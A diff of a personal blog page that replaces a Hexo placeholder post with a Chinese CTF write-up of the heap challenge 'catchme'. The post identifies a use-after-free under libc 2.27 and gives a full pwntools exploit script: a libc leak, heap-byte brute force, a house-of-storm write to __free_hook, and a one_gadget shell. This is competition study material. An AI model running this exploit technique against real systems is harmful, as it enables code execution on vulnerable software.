@@ -9,7 +9,7 @@
     
     <title>
         
-            Hello World |
+            2026长城杯半决赛 AWDP-PWN赛后回顾 |
         
         Zach0ry&#39;s blog
     </title>
@@ -205,7 +205,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        Hello World
+                        2026长城杯半决赛 AWDP-PWN赛后回顾
                     </div>
                 
 
@@ -233,19 +233,40 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2026-04-08 16:58:17</span>
+                <span class="datetime">2026-04-01 14:55:28</span>
             </span>
 
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Wed Apr 08 2026 16:58:17 GMT+0800">2026-04-08 16:58:17</span>
+                    <span class="datetime" data-updated="Fri Apr 10 2026 11:35:20 GMT+0800">2026-04-10 11:35:20</span>
                 </span>
             
         
 
         
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/WP/">WP</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
 
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/WP/">WP</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/patch/">patch</a></li>
+                        
+                    
+                </ul>
+            </span>
         
 
         
@@ -266,19 +287,23 @@
                     
 
                     
-                         <p>Welcome to <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/" >Hexo<i class="fas fa-external-link-alt"></i></a>! This is your very first post. Check <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/" >documentation<i class="fas fa-external-link-alt"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fas fa-external-link-alt"></i></a> or you can ask me on <a class="link"   target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fas fa-external-link-alt"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+                         <p>前段时间参加了ciscn华中赛区的半决赛，成绩不是很理想，本来想记录一下的，一直拖着没搞，趁着今天空闲时间比较长来复现一下题目</p>
+<h2 id="catchme"><a href="#catchme" class="headerlink" title="catchme"></a>catchme</h2><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260409161831773.png"  alt="image-20260409161831773"></p>
+<p>add看到有三种模式的malloc，并且会输出chunk地址的WORD2</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260409162114481.png"  alt="image-20260409162114481"></p>
+<p>uaf漏洞</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260409162345970.png" ></p>
+<p>有show，终于不用通过IO结构体去操作了，但是只能show1次</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260409162451752.png" ></p>
+<p>从user_con+8处开始填入，只能改0x18大小，并且限制次数为3次</p>
+<p>分析:</p>
+<p>2.27的libc版本，3个malloc的大小中还有一个0x50,PIE的 x64 程序的堆地址总是 0x55xxxx… 或者 0x56xxxx…，考虑house of storm，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">file_path = &quot;./catchme&quot;</span><br><span class="line">remote_host = &quot;127.0.0.1&quot;</span><br><span class="line">remote_port = 1111</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">context.terminal = [</span><br><span class="line">    &quot;wt.exe&quot;, &quot;--profile&quot;, &quot;WSL GDB (Black)&quot;,</span><br><span class="line">    &quot;wsl.exe&quot;, &quot;bash&quot;, &quot;-ic&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">def dbg():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def sla(a, b): p.sendlineafter(a, b)</span><br><span class="line">def sl(a): p.sendline(a)</span><br><span class="line">def s(a): p.send(a)</span><br><span class="line">def ru(a): p.recvuntil(a)</span><br><span class="line">def sa(a, b): p.sendafter(a, b)</span><br><span class="line">def bin_sys(libc_base): return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">def uu64(): return u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">def uu32(): return u32(p.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4, b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line"># --- 封装函数修改为 add/edit/free 风格 ---</span><br><span class="line"></span><br><span class="line">def add(idx):</span><br><span class="line">    sla(&quot;&gt;&gt;\n&quot;, &#x27;1&#x27;)</span><br><span class="line">    sla(&quot;(3)otter\n&quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    sla(&quot;&gt;&gt;\n&quot;, &quot;2&quot;)</span><br><span class="line">    sla(&quot;index:\n&quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    sla(&quot;&gt;&gt;\n&quot;, &quot;3&quot;)</span><br><span class="line">    sla(&quot;index:\n&quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line">    sla(&quot;&gt;&gt;\n&quot;, &quot;4&quot;)</span><br><span class="line">    sla(&quot;index:\n&quot;, str(idx))</span><br><span class="line">    sa(&quot;set tag:\n&quot;, content)</span><br><span class="line"></span><br><span class="line">def clean_note(idx):</span><br><span class="line">    sla(&quot;&gt;&gt;\n&quot;, &quot;6&quot;)</span><br><span class="line">    sla(&quot;index:\n&quot;, str(idx))</span><br><span class="line"></span><br><span class="line">def exploit():</span><br><span class="line"></span><br><span class="line">    for i in range(7):</span><br><span class="line">        add(3)</span><br><span class="line">        free(0)</span><br><span class="line">        clean_note(0)</span><br><span class="line"></span><br><span class="line">    add(1) # idx 0</span><br><span class="line">    add(1) # idx 1</span><br><span class="line">    free(0)</span><br><span class="line">    show(0)   </span><br><span class="line">    ru(&quot;tag:&quot;)  </span><br><span class="line">    libc_base = uu64() - 0x3ebca0</span><br><span class="line">    success(f&quot;libc_base: &#123;hex(libc_base)&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    add(2) # idx 2</span><br><span class="line">    ru(&quot;token(2):&quot;)</span><br><span class="line">    flag_hex_str = p.recvline().strip()</span><br><span class="line">    flag_value = int(flag_hex_str, 16)</span><br><span class="line">    if flag_value != 0x56:</span><br><span class="line">        log.warn(f&quot;Current flag &#123;hex(flag_value)&#125;, not 0x56, retrying...&quot;)</span><br><span class="line">        raise Exception(&quot;Brute force failed&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(2) # idx 3</span><br><span class="line">    free(2) #unsorted bin</span><br><span class="line">    free_hook = libc_base + 0x3ed8e8</span><br><span class="line">    payload_bk = p64(free_hook - 0x10 - 0x8)</span><br><span class="line">    edit(2, payload_bk)</span><br><span class="line"></span><br><span class="line">    # [bk] = free_hook - 0x10, [fd_nextsize] = 0 (防崩溃)</span><br><span class="line">    # [bk_nextsize] = 目标地址偏移，利用 large bin attack 写入堆地址作为 fake size</span><br><span class="line">    payload_large = p64(free_hook - 0x10) + p64(0)</span><br><span class="line">    payload_large += p64(free_hook - 0x18 - 0x10 - 0x8 - 5)</span><br><span class="line">    edit(0, payload_large)</span><br><span class="line"></span><br><span class="line">    one_gadget = libc_base + 0x4f302    </span><br><span class="line">    add(3)</span><br><span class="line">    edit(4, p64(one_gadget)) # 此时 idx 4 指向 free_hook 区域</span><br><span class="line">    </span><br><span class="line">    free(0) # 触发 system/one_gadget</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">count = 0</span><br><span class="line">while True:</span><br><span class="line">    count += 1</span><br><span class="line">    try:</span><br><span class="line">        if &#x27;re&#x27; in sys.argv:</span><br><span class="line">            p = remote(remote_host, remote_port)</span><br><span class="line">        else:</span><br><span class="line">            p = process(file_path)</span><br><span class="line">        </span><br><span class="line">        print(f&quot;[*] 第 &#123;count&#125; 次尝试爆破...&quot;)</span><br><span class="line">        exploit()</span><br><span class="line">        print(f&quot;[+] 爆破成功，共尝试了 &#123;count&#125; 次！&quot;)</span><br><span class="line">        break</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;[-] Wrong: &#123;e&#125;&quot;)</span><br><span class="line">        try:</span><br><span class="line">            p.close()</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html" >Writing<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/server.html" >Server<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html" >Generating<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a class="link"   target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fas fa-external-link-alt"></i></a></p>
+
 
                     
                 </div>
@@ -287,6 +312,18 @@
 
                 <div class="post-bottom-tags-and-share border-box">
                     <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/WP/">WP</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/patch/">patch</a>
+                                    </li>
+                                
+                            </ul>
                         
                     </div>
                     <div>
@@ -299,15 +336,31 @@
                 
                     <div class="post-nav border-box">
                         
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2026/04/04/Tenda%20A15%20%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
+                                   title="IOT漏洞挖掘初体验-Tenda A15"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">IOT漏洞挖掘初体验-Tenda A15</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
                         
                             <div class="next-post">
                                 <a class="next"
                                    rel="next"
-                                   href="/2026/04/04/Tenda%20A15%20%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"
-                                   title="IOT漏洞挖掘初体验-Tenda A15"
+                                   href="/2026/03/30/mips%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/"
+                                   title="mips汇编学习"
                                 >
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">IOT漏洞挖掘初体验-Tenda A15</span>
+                                        <span class="post-nav-title-item text-ellipsis">mips汇编学习</span>
                                         <span class="post-nav-item">Next posts</span>
                                     </span>
                                     <span class="right arrow-icon flex-center">
@@ -335,7 +388,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#catchme"><span class="nav-text">catchme</span></a></li></ol>
     </div>
 </div>
 
@@ -466,7 +519,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-Start"><span class="nav-text">Quick Start</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-new-post"><span class="nav-text">Create a new post</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Run-server"><span class="nav-text">Run server</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-static-files"><span class="nav-text">Generate static files</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Deploy-to-remote-sites"><span class="nav-text">Deploy to remote sites</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#catchme"><span class="nav-text">catchme</span></a></li></ol>
     </div>
 </div>
 
